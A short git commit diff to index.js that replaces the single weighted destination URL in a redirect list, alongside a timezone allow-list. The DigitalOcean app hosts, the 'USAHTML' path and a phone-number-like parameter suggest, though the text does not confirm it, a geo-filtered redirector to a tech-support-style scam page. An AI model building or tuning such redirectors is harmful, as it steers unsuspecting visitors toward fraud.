50c103691ccf508368c409655fb22e30fb83a7cf
paalakash <palaksh452@gmail.com>
2026-07-14 07:17:37 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://goldfish-app-cguta.ondigitalocean.app/werrx01USAHTML/?bcda=1800-051-206", weight: 1.0 }
+    { url: "https://seahorse-app-63hkv.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
     
 ];
 
